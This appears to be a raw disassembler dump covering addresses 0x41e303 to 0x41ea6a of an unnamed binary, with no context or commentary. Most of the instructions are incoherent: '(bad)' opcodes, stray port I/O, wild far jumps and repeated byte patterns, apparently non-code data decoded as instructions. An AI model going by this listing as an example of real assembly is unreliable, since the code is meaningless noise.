  41e303:	nop
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	add    BYTE PTR [edi+edx*4-0x64666c97],0x65
  41e30d:	lahf   
  41e30e:	popf   
  41e30f:	lahf   
  41e310:	popa   
  41e311:	fwait
  41e312:	mov    eax,ds:0xa5a75da3
  41e317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e318:	pop    ecx
  41e319:	mov    ds:0xb855aba9,eax
  41e31e:	mov    esp,0xb0ac50ac
  41e323:	mov    al,0x4c
  41e325:	mov    al,ds:0xb349b7a4
  41e32a:	mov    ecx,0xbdbf45bb
  41e32f:	mov    edi,0xc3c1bb41
  41e334:	cmp    eax,0x39c7c5c7
  41e339:	ret    
  41e33a:	leave  
  41e33b:	retf   
  41e33c:	xor    eax,0x30ccdcd8
  41e341:	int3   
  41e342:	rcl    al,1
  41e344:	sub    al,0xc0
  41e346:	(bad)  
  41e347:	xlat   BYTE PTR ds:[ebx]
  41e348:	sub    ebx,edx
  41e34a:	(bad)  
  41e34c:	and    eax,0x21dfdddf
  41e351:	fndisi(8087 only) 
  41e353:	jecxz  0x41e372
  41e355:	out    0xe5,eax
  41e357:	out    0x19,eax
  41e359:	jecxz  0x41e344
  41e35b:	jmp    0x41e372
  41e35d:	clc    
  41e35e:	cld    
  41e35f:	in     al,dx
  41e360:	adc    ah,ch
  41e362:	lock lock or al,0xe0
  41e366:	in     al,0xe4
  41e368:	clc    
  41e369:	in     al,0xe8
  41e36b:	hlt    
  41e36c:	clc    
  41e36d:	(bad)  
  41e36e:	std    
  41e36f:	inc    DWORD PTR [ecx]
  41e371:	sti    
  41e372:	add    DWORD PTR [ebx],eax
  41e374:	std    
  41e375:	pop    es
  41e376:	add    eax,0x18140c00
  41e37b:	sbb    BYTE PTR [eax+ebx*1],al
  41e37e:	sbb    al,0xc
  41e380:	lock or al,0x10
  41e383:	adc    ah,ch
  41e385:	add    BYTE PTR [esp+eax*1],al
  41e388:	sbb    BYTE PTR [eax+edx*1],al
  41e38b:	sbb    esp,ebp
  41e38d:	pop    ds
  41e38e:	sbb    eax,0x211be11f
  41e393:	and    ebx,ebp
  41e395:	daa    
  41e396:	and    eax,0x382cd927
  41e39b:	cmp    BYTE PTR [eax+edi*1],ah
  41e39e:	cmp    al,0x2c
  41e3a0:	shr    BYTE PTR [eax+esi*1],1
  41e3a3:	xor    ah,cl
  41e3a5:	daa    
  41e3a6:	and    al,0x24
  41e3a8:	cmp    al,0x30
  41e3aa:	cmp    DWORD PTR [ebx],edi
  41e3ac:	lds    edi,FWORD PTR [edi]
  41e3ae:	cmp    eax,0x4339c13f
  41e3b3:	inc    ebx
  41e3b4:	mov    ebp,0xb9474547
  41e3b9:	inc    ebx
  41e3ba:	dec    esp
  41e3bb:	inc    esp
  41e3bc:	inc    esp
  41e3bd:	pop    eax
  41e3be:	pop    ebp
  41e3bf:	dec    esp
  41e3c0:	mov    al,0x4c
  41e3c2:	push   eax
  41e3c3:	push   eax
  41e3c4:	pop    esp
  41e3c5:	inc    eax
  41e3c6:	inc    esp
  41e3c7:	pop    esp
  41e3c8:	test   eax,0xa55b5953
  41e3cd:	pop    edi
  41e3ce:	pop    ebp
  41e3cf:	pop    edi
  41e3d0:	mov    eax,ds:0x9d636a51
  41e3d5:	addr16 gs addr16 cdq 
  41e3d9:	arpl   WORD PTR [ecx+0x6b],bp
  41e3dc:	ins    BYTE PTR es:[edi],dx
  41e3dd:	js     0x41e45b
  41e3df:	jl     0x41e371
  41e3e1:	ins    BYTE PTR es:[edi],dx
  41e3e2:	jo     0x41e444
  41e3e4:	jl     0x41e446
  41e3e6:	fs jg  0x41e45e
  41e3e9:	jae    0x41e464
  41e3eb:	jnp    0x41e372
  41e3ed:	jg     0x41e46c
  41e3ef:	jg     0x41e46b
  41e3f1:	ins    BYTE PTR es:[edi],dx
  41e3f2:	nop
  41e3f3:	xchg   DWORD PTR [ebp-0x79],edi
  41e3f6:	test   DWORD PTR [edi-0x70767c87],eax
  41e3fc:	lea    ebx,[eax-0x737f6364]
  41e402:	nop
  41e403:	nop
  41e404:	ins    BYTE PTR es:[edi],dx
  41e405:	xchg   DWORD PTR [esp+eax*4-0x626f7868],eax
  41e40c:	gs lahf 
  41e40e:	popf   
  41e40f:	sahf   
  41e410:	xchg   ebp,eax
  41e411:	mov    WORD PTR [eax-0x5a58a251],?
  41e417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e419:	lods   al,BYTE PTR ds:[esi]
  41e41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e41b:	mov    eax,0xacbdb8a4
  41e420:	push   eax
  41e421:	lods   al,BYTE PTR ds:[esi]
  41e422:	mov    al,0xb0
  41e424:	dec    esp
  41e425:	mov    al,0xb4
  41e427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e428:	mov    eax,0xb3a8a8a4
  41e42d:	mov    cl,0xbe
  41e42f:	mov    ah,0xb0
  41e431:	lods   al,BYTE PTR ds:[esi]
  41e432:	rcl    al,1
  41e434:	(bad)  
  41e435:	mov    bl,0xc9
  41e438:	enter  0xd8d4,0xd8
  41e43c:	(bad)
  41e43f:	int3   
  41e440:	xor    ah,cl
  41e442:	rcl    al,1
  41e444:	sub    al,0xd0
  41e446:	aam    0xd4
  41e448:	sub    ah,dl
  41e44a:	leave  
  41e44b:	enter  0xc8d4,0xd2
  41e44f:	int3   
  41e450:	rcr    ah,1
  41e452:	loopne 0x41e444
  41e454:	out    dx,al
  41e455:	repnz hlt 
  41e457:	hlt    
  41e458:	call   0x152acd50
  41e45d:	call   0xec52d14e
  41e462:	lock lock or al,0xf0
  41e466:	hlt    
  41e467:	hlt    
  41e468:	or     ah,dh
  41e46a:	clc    
  41e46b:	clc    
  41e46c:	add    al,0xef
  41e46e:	in     al,dx
  41e46f:	in     al,dx
  41e470:	icebp  
  41e471:	cld    
  41e472:	add    BYTE PTR [ebx],dl
  41e474:	or     al,0x10
  41e476:	adc    eax,0x804f804
  41e47b:	or     ah,dh
  41e47d:	or     BYTE PTR [esp+ecx*1],cl
  41e480:	lock or al,0xf0
  41e483:	adc    ah,ch
  41e485:	sbb    esp,esi
  41e487:	adc    al,0xe8
  41e489:	sbb    eax,0x11e418f8
  41e48e:	cld    
  41e48f:	sbb    al,0xe0
  41e491:	adc    eax,0x29dc20c0
  41e496:	les    esp,FWORD PTR [eax+ebx*8]
  41e499:	sub    eax,0x21d428c8
  41e49e:	int3   
  41e49f:	sub    al,0xd0
  41e4a1:	and    eax,0x39cc30d0
  41e4a6:	aam    0x34
  41e4a8:	enter  0xd83d,0x38
  41e4ac:	les    esi,FWORD PTR [ecx]
  41e4ae:	fdivr  QWORD PTR [eax+eax*8]
  41e4b1:	xor    eax,0x49bc40a0
  41e4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4b7:	inc    esp
  41e4b8:	mov    eax,0xb448a84d
  41e4bd:	inc    ecx
  41e4be:	lods   al,BYTE PTR ds:[esi]
  41e4bf:	dec    esp
  41e4c0:	mov    al,0x45
  41e4c2:	mov    al,0x50
  41e4c4:	lods   al,BYTE PTR ds:[esi]
  41e4c5:	pop    ecx
  41e4c6:	mov    ah,0x54
  41e4c8:	test   al,0x5d
  41e4ca:	mov    eax,0xbc51a458
  41e4cf:	pop    esp
  41e4d0:	mov    al,ds:0x9c608055
  41e4d5:	imul   eax,DWORD PTR [esp+eiz*2+0x68886d98],0x6c8c6194
  41e4e0:	nop
  41e4e1:	gs nop
  41e4e3:	jo     0x41e471
  41e4e5:	jns    0x41e47b
  41e4e7:	je     0x41e471
  41e4e9:	jge    0x41e4a3
  41e4eb:	js     0x41e471
  41e4ed:	jge    0x41e4eb
  41e4ef:	jl     0x41e471
  41e4f1:	jnp    0x41e553
  41e4f3:	cmp    BYTE PTR [ecx+ecx*4+0x7c],0x84
  41e4f8:	js     0x41e49f
  41e4fa:	ja     0x41e487
  41e4fc:	hlt    
  41e4fd:	mov    DWORD PTR [ebx+0x6f],esi
  41e500:	or     ecx,DWORD PTR [ebp-0x6f936f48]
  41e506:	mov    ah,0x94
  41e508:	push   0x6498d894
  41e50d:	cwde   
  41e50e:	popf   
  41e50f:	pushf  
  41e510:	sbb    BYTE PTR [eax+eiz*4+0x24a05ca0],0xb4
  41e518:	pop    eax
  41e519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e51a:	test   al,0xa8
  41e51c:	push   esp
  41e51d:	test   al,0xac
  41e51f:	lods   al,BYTE PTR ds:[esi]
  41e520:	push   eax
  41e521:	lods   al,BYTE PTR ds:[esi]
  41e522:	mov    al,0xb0
  41e524:	dec    esp
  41e525:	mov    al,0xb4
  41e527:	mov    ah,0x48
  41e529:	mov    ah,0xb8
  41e52b:	mov    eax,0xbcbcb844
  41e530:	inc    eax
  41e531:	mov    esp,0xc03cc0c0
  41e536:	xor    dh,BYTE PTR [edx]
  41e538:	xor    al,ch
  41e53a:	ds ds ds leave 
  41e53e:	cmp    bh,BYTE PTR [edx]
  41e540:	cmp    cl,ch
  41e542:	es es shl DWORD PTR es:[edx],1
  41e547:	and    ah,BYTE PTR [edx]
  41e549:	aad    0x2e
  41e54b:	cs fldcw WORD PTR cs:[edx]
  41e54f:	sub    ch,BYTE PTR [edx]
  41e551:	fst    QWORD PTR [esi]
  41e553:	push   ss
  41e554:	push   ss
  41e555:	loope  0x41e569
  41e557:	adc    dl,BYTE PTR [edx]
  41e559:	in     eax,0x1e
  41e55b:	push   ds
  41e55c:	push   ds
  41e55d:	jmp    0xed5bff7c
  41e562:	push   es
  41e563:	push   es
  41e564:	push   es
  41e565:	icebp  
  41e566:	add    al,BYTE PTR [edx]
  41e568:	add    dh,ch
  41e56a:	push   cs
  41e56b:	push   cs
  41e56c:	push   cs
  41e56d:	stc    
  41e56e:	or     cl,BYTE PTR [edx]
  41e570:	or     bh,ch
  41e572:	div    dh
  41e574:	test   BYTE PTR [ecx],0xf2
  41e577:	repnz repnz add eax,0x9fefefe
  41e57e:	cli    
  41e57f:	cli    
  41e580:	cli    
  41e581:	or     eax,0x11e6e6e6
  41e586:	loop   0x41e56a
  41e588:	loop   0x41e59f
  41e58a:	out    dx,al
  41e58b:	out    dx,al
  41e58c:	out    dx,al
  41e58d:	sbb    edx,ebp
  41e58f:	jmp    0x21d6:0xd6d61dea
  41e596:	rcl    dl,cl
  41e598:	shl    BYTE PTR ds:0x29dedede,cl
  41e59e:	sub    al,0x2c
  41e5a0:	shr    BYTE PTR [eax+esi*1],1
  41e5a3:	xor    ah,cl
  41e5a5:	xor    BYTE PTR [esp+esi*1],dh
  41e5a8:	enter  0x3834,0x38
  41e5ac:	les    edi,FWORD PTR [eax]
  41e5ae:	cmp    al,0x3c
  41e5b0:	sar    BYTE PTR [eax+eax*2],0x40
  41e5b4:	mov    esp,0xb2b2b240
  41e5b9:	inc    ebp
  41e5ba:	mov    esi,0xba49bebe
  41e5bf:	mov    edx,0xa6a64dba
  41e5c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5c5:	push   ecx
  41e5c6:	mov    ds:0xae55a2a2,al
  41e5cb:	scas   al,BYTE PTR es:[edi]
  41e5cc:	scas   al,BYTE PTR es:[edi]
  41e5cd:	pop    ecx
  41e5ce:	stos   BYTE PTR es:[edi],al
  41e5cf:	stos   BYTE PTR es:[edi],al
  41e5d0:	stos   BYTE PTR es:[edi],al
  41e5d1:	pop    ebp
  41e5d2:	xchg   esi,eax
  41e5d3:	xchg   esi,eax
  41e5d4:	xchg   esi,eax
  41e5d5:	popa   
  41e5d6:	xchg   edx,eax
  41e5d7:	xchg   edx,eax
  41e5d8:	xchg   edx,eax
  41e5d9:	gs sahf 
  41e5db:	sahf   
  41e5dc:	sahf   
  41e5dd:	imul   ebx,DWORD PTR [edx-0x79926566],0x82718686
  41e5e7:	add    BYTE PTR [edx-0x7171718b],0x79
  41e5ee:	mov    cl,BYTE PTR [edx+0x76767d8a]
  41e5f4:	jbe    0x41e577
  41e5f6:	jb     0x41e66a
  41e5f8:	jb     0x41e57f
  41e5fa:	jle    0x41e67a
  41e5fc:	jle    0x41e587
  41e5fe:	jp     0x41e67a
  41e600:	jp     0x41e58f
  41e602:	data16 data16 xchg cx,ax
  41e606:	bound  esp,QWORD PTR [edx+0x62]
  41e609:	xchg   ebp,eax
  41e60a:	outs   dx,BYTE PTR ds:[esi]
  41e60b:	outs   dx,BYTE PTR ds:[esi]
  41e60c:	outs   dx,BYTE PTR ds:[esi]
  41e60d:	cdq    
  41e60e:	push   0x6a
  41e610:	push   0xffffff9d
  41e612:	push   esi
  41e613:	push   esi
  41e614:	push   esi
  41e615:	mov    eax,ds:0xa5525252
  41e61a:	pop    esi
  41e61b:	pop    esi
  41e61c:	pop    esi
  41e61d:	test   eax,0xac50acac
  41e622:	mov    al,0xb0
  41e624:	dec    esp
  41e625:	mov    al,0xb4
  41e627:	mov    ah,0x48
  41e629:	mov    ah,0xb8
  41e62b:	mov    eax,0xbcbcb844
  41e630:	inc    eax
  41e631:	mov    esp,0xc03cc0c0
  41e636:	xor    dh,BYTE PTR [edx]
  41e638:	xor    al,ch
  41e63a:	ds ds ds leave 
  41e63e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e644:	xchg   edx,eax
  41e645:	rcl    DWORD PTR [esi-0x652a696a],1
  41e64b:	call   0xdd9e:0x9e9ed99a
  41e652:	mov    ds:0xa6e1a2a2,al
  41e657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e659:	in     eax,0xaa
  41e65b:	stos   BYTE PTR es:[edi],al
  41e65c:	stos   BYTE PTR es:[edi],al
  41e65d:	jmp    0xedf09510
  41e662:	mov    dl,0xb2
  41e664:	mov    dl,0xf1
  41e666:	mov    dh,0xb6
  41e668:	mov    dh,0xf5
  41e66a:	mov    edx,0xbef9baba
  41e66f:	mov    esi,0x4242fdbe
  41e674:	inc    edx
  41e675:	add    DWORD PTR [esi+0x46],eax
  41e678:	inc    esi
  41e679:	add    eax,0x94a4a4a
  41e67e:	dec    esi
  41e67f:	dec    esi
  41e680:	dec    esi
  41e681:	or     eax,0x11525252
  41e686:	push   esi
  41e687:	push   esi
  41e688:	push   esi
  41e689:	adc    eax,0x195a5a5a
  41e68e:	pop    esi
  41e68f:	pop    esi
  41e690:	pop    esi
  41e691:	sbb    eax,0x21626262
  41e696:	rcl    dl,cl
  41e698:	shl    BYTE PTR ds:0x29dedede,cl
  41e69e:	sub    al,0x2c
  41e6a0:	shr    BYTE PTR [eax+esi*1],1
  41e6a3:	xor    ah,cl
  41e6a5:	xor    BYTE PTR [esp+esi*1],dh
  41e6a8:	enter  0x3834,0x38
  41e6ac:	les    edi,FWORD PTR [eax]
  41e6ae:	cmp    al,0x3c
  41e6b0:	sar    BYTE PTR [eax+eax*2],0x40
  41e6b4:	mov    esp,0xb2b2b240
  41e6b9:	inc    ebp
  41e6ba:	mov    esi,0xe49bebe
  41e6bf:	push   cs
  41e6c0:	push   cs
  41e6c1:	dec    ebp
  41e6c2:	adc    dl,BYTE PTR [edx]
  41e6c4:	adc    dl,BYTE PTR [ecx+0x16]
  41e6c7:	push   ss
  41e6c8:	push   ss
  41e6c9:	push   ebp
  41e6ca:	sbb    bl,BYTE PTR [edx]
  41e6cc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41e6cf:	push   ds
  41e6d0:	push   ds
  41e6d1:	pop    ebp
  41e6d2:	and    ah,BYTE PTR [edx]
  41e6d4:	and    ah,BYTE PTR [ecx+0x26]
  41e6d7:	es es sub ch,BYTE PTR gs:[edx]
  41e6dc:	sub    ch,BYTE PTR [ecx+0x2e]
  41e6df:	cs cs ins DWORD PTR es:[edi],dx
  41e6e2:	xor    dh,BYTE PTR [edx]
  41e6e4:	xor    dh,BYTE PTR [ecx+0x36]
  41e6e7:	ss ss jne 0x41e725
  41e6eb:	cmp    bh,BYTE PTR [edx]
  41e6ed:	jns    0x41e72d
  41e6ef:	ds ds jge 0x41e6b5
  41e6f3:	ret    0x81c2
  41e6f6:	mov    dh,0xc6
  41e6f9:	test   edx,ecx
  41e6fb:	retf   0x89ca
  41e6fe:	into   
  41e6ff:	into   
  41e700:	into   
  41e701:	(bad)  
  41e702:	rcl    dl,cl
  41e704:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41e70a:	fcmovu st,st(2)
  41e70c:	ficomp DWORD PTR [ecx-0x62212122]
  41e712:	loop   0x41e6f6
  41e714:	loop   0x41e6b7
  41e716:	push   edx
  41e717:	push   edx
  41e718:	push   edx
  41e719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e71a:	pop    esi
  41e71b:	pop    esi
  41e71c:	pop    esi
  41e71d:	test   eax,0xac50acac
  41e722:	mov    al,0xb0
  41e724:	dec    esp
  41e725:	mov    al,0xb4
  41e727:	mov    ah,0x48
  41e729:	mov    ah,0xb8
  41e72b:	mov    eax,0xbcbcb844
  41e730:	inc    eax
  41e731:	mov    esp,0xc03cc0c0
  41e736:	xor    dh,BYTE PTR [edx]
  41e738:	xor    al,ch
  41e73a:	ds ds ds leave 
  41e73e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e744:	xchg   edx,eax
  41e745:	rcl    DWORD PTR [esi-0x652a696a],1
  41e74b:	call   0xdd9e:0x9e9ed99a
  41e752:	mov    ds:0xa6e1a2a2,al
  41e757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e759:	in     eax,0xaa
  41e75b:	stos   BYTE PTR es:[edi],al
  41e75c:	stos   BYTE PTR es:[edi],al
  41e75d:	jmp    0xedf09610
  41e762:	mov    dl,0xb2
  41e764:	mov    dl,0xf1
  41e766:	mov    dh,0xb6
  41e768:	mov    dh,0xf5
  41e76a:	mov    edx,0xbef9baba
  41e76f:	mov    esi,0x4242fdbe
  41e774:	inc    edx
  41e775:	add    DWORD PTR [esi+0x46],eax
  41e778:	inc    esi
  41e779:	add    eax,0x94a4a4a
  41e77e:	dec    esi
  41e77f:	dec    esi
  41e780:	dec    esi
  41e781:	or     eax,0x11525252
  41e786:	push   esi
  41e787:	push   esi
  41e788:	push   esi
  41e789:	adc    eax,0x195a5a5a
  41e78e:	pop    esi
  41e78f:	pop    esi
  41e790:	pop    esi
  41e791:	sbb    eax,0x21626262
  41e796:	rcl    dl,cl
  41e798:	shl    BYTE PTR ds:0x29dedede,cl
  41e79e:	sub    al,0x2c
  41e7a0:	shr    BYTE PTR [eax+esi*1],1
  41e7a3:	xor    ah,cl
  41e7a5:	xor    BYTE PTR [esp+esi*1],dh
  41e7a8:	enter  0x3834,0x38
  41e7ac:	les    edi,FWORD PTR [eax]
  41e7ae:	cmp    al,0x3c
  41e7b0:	sar    BYTE PTR [eax+eax*2],0x40
  41e7b4:	mov    esp,0xb2b2b240
  41e7b9:	inc    ebp
  41e7ba:	mov    esi,0xe49bebe
  41e7bf:	push   cs
  41e7c0:	push   cs
  41e7c1:	dec    ebp
  41e7c2:	adc    dl,BYTE PTR [edx]
  41e7c4:	adc    dl,BYTE PTR [ecx+0x16]
  41e7c7:	push   ss
  41e7c8:	push   ss
  41e7c9:	push   ebp
  41e7ca:	test   eax,0xad59b4a9
  41e7cf:	lods   eax,DWORD PTR ds:[esi]
  41e7d0:	mov    al,0x5d
  41e7d2:	xchg   ecx,eax
  41e7d3:	xchg   ecx,eax
  41e7d4:	mov    WORD PTR [ecx-0x6b],fs
  41e7d7:	xchg   ebp,eax
  41e7d8:	mov    BYTE PTR [ebp-0x67],ah
  41e7db:	cdq    
  41e7dc:	test   BYTE PTR [ecx-0x63],ch
  41e7df:	popf   
  41e7e0:	sub    BYTE PTR [ebp+0x32],0x32
  41e7e4:	xor    dh,BYTE PTR [ecx+0x36]
  41e7e7:	ss ss jne 0x41e825
  41e7eb:	cmp    bh,BYTE PTR [edx]
  41e7ed:	jns    0x41e82d
  41e7ef:	ds ds jge 0x41e864
  41e7f3:	jno    0x41e861
  41e7f5:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e7fc:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e800:	pusha  
  41e801:	lea    esp,[ecx+0x61]
  41e804:	jl     0x41e797
  41e806:	gs gs js 0x41e79f
  41e80a:	fcmovu st,st(2)
  41e80c:	ficomp DWORD PTR [ecx-0x62212122]
  41e812:	loop   0x41e7f6
  41e814:	loop   0x41e7b7
  41e816:	push   edx
  41e817:	push   edx
  41e818:	push   edx
  41e819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e81a:	pop    esi
  41e81b:	pop    esi
  41e81c:	pop    esi
  41e81d:	test   eax,0xac50acac
  41e822:	mov    al,0xb0
  41e824:	dec    esp
  41e825:	mov    al,0xb4
  41e827:	mov    ah,0x48
  41e829:	mov    ah,0xb8
  41e82b:	mov    eax,0xbcbcb844
  41e830:	inc    eax
  41e831:	mov    esp,0xc03cc0c0
  41e836:	xor    dh,BYTE PTR [edx]
  41e838:	xor    al,ch
  41e83a:	ds ds ds leave 
  41e83e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e844:	xchg   edx,eax
  41e845:	rcl    DWORD PTR [esi+0x29d59696],1
  41e84b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e84e:	sub    eax,0x11dd302d
  41e853:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e856:	adc    eax,0x19e50815
  41e85b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e85e:	sbb    eax,0xb2ed001d
  41e863:	mov    dl,0xb2
  41e865:	icebp  
  41e866:	mov    dh,0xb6
  41e868:	mov    dh,0xf5
  41e86a:	mov    edx,0xbef9baba
  41e86f:	mov    esi,0xf1f1fdbe
  41e874:	in     al,dx
  41e875:	add    ebp,esi
  41e877:	cmc    
  41e878:	call   0xe53be182
  41e87d:	or     ebp,edi
  41e87f:	std    
  41e880:	loopne 0x41e88f
  41e882:	loope  0x41e865
  41e884:	cld    
  41e885:	adc    ebp,esp
  41e887:	in     eax,0xf8
  41e889:	adc    eax,0x195a5a5a
  41e88e:	pop    esi
  41e88f:	pop    esi
  41e890:	pop    esi
  41e891:	sbb    eax,0x21626262
  41e896:	rcl    dl,cl
  41e898:	shl    BYTE PTR ds:0x29dedede,cl
  41e89e:	sub    al,0x2c
  41e8a0:	shr    BYTE PTR [eax+esi*1],1
  41e8a3:	xor    ah,cl
  41e8a5:	xor    BYTE PTR [esp+esi*1],dh
  41e8a8:	enter  0x3834,0x38
  41e8ac:	les    edi,FWORD PTR [eax]
  41e8ae:	cmp    al,0x3c
  41e8b0:	sar    BYTE PTR [eax+eax*2],0x40
  41e8b4:	mov    esp,0xb2b2b240
  41e8b9:	inc    ebp
  41e8ba:	mov    esi,0xe49bebe
  41e8bf:	push   cs
  41e8c0:	push   cs
  41e8c1:	dec    ebp
  41e8c2:	adc    dl,BYTE PTR [edx]
  41e8c4:	adc    dl,BYTE PTR [ecx+0x16]
  41e8c7:	push   ss
  41e8c8:	push   ss
  41e8c9:	push   ebp
  41e8ca:	test   eax,0xad59b4a9
  41e8cf:	lods   eax,DWORD PTR ds:[esi]
  41e8d0:	mov    al,0x5d
  41e8d2:	xchg   ecx,eax
  41e8d3:	xchg   ecx,eax
  41e8d4:	mov    WORD PTR [ecx-0x6b],fs
  41e8d7:	xchg   ebp,eax
  41e8d8:	mov    BYTE PTR [ebp-0x67],ah
  41e8db:	cdq    
  41e8dc:	test   BYTE PTR [ecx-0x63],ch
  41e8df:	popf   
  41e8e0:	sub    BYTE PTR [ebp+0x32],0x32
  41e8e4:	xor    dh,BYTE PTR [ecx+0x36]
  41e8e7:	ss ss jne 0x41e925
  41e8eb:	cmp    bh,BYTE PTR [edx]
  41e8ed:	jns    0x41e92d
  41e8ef:	ds ds jge 0x41e964
  41e8f3:	jno    0x41e961
  41e8f5:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e8fc:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e900:	pusha  
  41e901:	lea    esp,[ecx+0x61]
  41e904:	jl     0x41e897
  41e906:	gs gs js 0x41e89f
  41e90a:	fcmovu st,st(2)
  41e90c:	ficomp DWORD PTR [ecx-0x62212122]
  41e912:	loop   0x41e8f6
  41e914:	loop   0x41e8b7
  41e916:	push   edx
  41e917:	push   edx
  41e918:	push   edx
  41e919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e91a:	pop    esi
  41e91b:	pop    esi
  41e91c:	pop    esi
  41e91d:	test   eax,0xac50acac
  41e922:	mov    al,0xb0
  41e924:	dec    esp
  41e925:	mov    al,0xb4
  41e927:	mov    ah,0x48
  41e929:	mov    ah,0xb8
  41e92b:	mov    eax,0xbcbcb844
  41e930:	inc    eax
  41e931:	mov    esp,0xc03cc0c0
  41e936:	xor    dh,BYTE PTR [edx]
  41e938:	xor    al,ch
  41e93a:	ds ds ds leave 
  41e93e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e944:	xchg   edx,eax
  41e945:	rcl    DWORD PTR [esi+0x29d59696],1
  41e94b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e94e:	sub    eax,0x11dd302d
  41e953:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e956:	adc    eax,0x19e50815
  41e95b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e95e:	sbb    eax,0xb2ed001d
  41e963:	mov    dl,0xb2
  41e965:	icebp  
  41e966:	mov    dh,0xb6
  41e968:	mov    dh,0xf5
  41e96a:	mov    edx,0xbef9baba
  41e96f:	mov    esi,0xf1f1fdbe
  41e974:	in     al,dx
  41e975:	add    ebp,esi
  41e977:	cmc    
  41e978:	call   0xe53be282
  41e97d:	or     ebp,edi
  41e97f:	std    
  41e980:	loopne 0x41e98f
  41e982:	loope  0x41e965
  41e984:	cld    
  41e985:	adc    ebp,esp
  41e987:	in     eax,0xf8
  41e989:	adc    eax,0x195a5a5a
  41e98e:	pop    esi
  41e98f:	pop    esi
  41e990:	pop    esi
  41e991:	sbb    eax,0x21626262
  41e996:	rcl    dl,cl
  41e998:	shl    BYTE PTR ds:0x29dedede,cl
  41e99e:	sub    al,0x2c
  41e9a0:	shr    BYTE PTR [eax+esi*1],1
  41e9a3:	xor    ah,cl
  41e9a5:	xor    BYTE PTR [esp+esi*1],dh
  41e9a8:	enter  0x3834,0x38
  41e9ac:	les    edi,FWORD PTR [eax]
  41e9ae:	cmp    al,0x3c
  41e9b0:	sar    BYTE PTR [eax+eax*2],0x40
  41e9b4:	mov    esp,0xb2b2b240
  41e9b9:	inc    ebp
  41e9ba:	mov    esi,0xe49bebe
  41e9bf:	push   cs
  41e9c0:	push   cs
  41e9c1:	dec    ebp
  41e9c2:	adc    dl,BYTE PTR [edx]
  41e9c4:	adc    dl,BYTE PTR [ecx+0x16]
  41e9c7:	push   ss
  41e9c8:	push   ss
  41e9c9:	push   ebp
  41e9ca:	test   eax,0xad59b4a9
  41e9cf:	lods   eax,DWORD PTR ds:[esi]
  41e9d0:	mov    al,0x5d
  41e9d2:	xchg   ecx,eax
  41e9d3:	xchg   ecx,eax
  41e9d4:	mov    WORD PTR [ecx-0x6b],fs
  41e9d7:	xchg   ebp,eax
  41e9d8:	mov    BYTE PTR [ebp-0x67],ah
  41e9db:	cdq    
  41e9dc:	test   BYTE PTR [ecx-0x63],ch
  41e9df:	popf   
  41e9e0:	sub    BYTE PTR [ebp+0x32],0x32
  41e9e4:	xor    dh,BYTE PTR [ecx+0x36]
  41e9e7:	ss ss jne 0x41ea25
  41e9eb:	cmp    bh,BYTE PTR [edx]
  41e9ed:	jns    0x41ea2d
  41e9ef:	ds ds jge 0x41ea64
  41e9f3:	jno    0x41ea61
  41e9f5:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e9fc:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41ea00:	pusha  
  41ea01:	lea    esp,[ecx+0x61]
  41ea04:	jl     0x41e997
  41ea06:	gs gs js 0x41e99f
  41ea0a:	fcmovu st,st(2)
  41ea0c:	ficomp DWORD PTR [ecx-0x62212122]
  41ea12:	loop   0x41e9f6
  41ea14:	loop   0x41e9b7
  41ea16:	push   edx
  41ea17:	push   edx
  41ea18:	push   edx
  41ea19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea1a:	pop    esi
  41ea1b:	pop    esi
  41ea1c:	pop    esi
  41ea1d:	test   eax,0xac50acac
  41ea22:	mov    al,0xb0
  41ea24:	dec    esp
  41ea25:	mov    al,0xb4
  41ea27:	mov    ah,0x48
  41ea29:	mov    ah,0xb8
  41ea2b:	mov    eax,0xbcbcb844
  41ea30:	inc    eax
  41ea31:	mov    esp,0xc03cc0c0
  41ea36:	xor    dh,BYTE PTR [edx]
  41ea38:	xor    al,ch
  41ea3a:	ds ds ds leave 
  41ea3e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41ea44:	xchg   edx,eax
  41ea45:	rcl    DWORD PTR [esi+0x29d59696],1
  41ea4b:	sub    DWORD PTR [ecx+ebx*8],esi
  41ea4e:	sub    eax,0x11dd302d
  41ea53:	adc    DWORD PTR [ecx+eiz*8],ecx
  41ea56:	adc    eax,0x19e50815
  41ea5b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41ea5e:	sbb    eax,0xb2ed001d
  41ea63:	mov    dl,0xb2
  41ea65:	icebp  
  41ea66:	mov    dh,0xb6
  41ea68:	mov    dh,0xf5
  41ea6a:	mov    edx,0xbef9baba
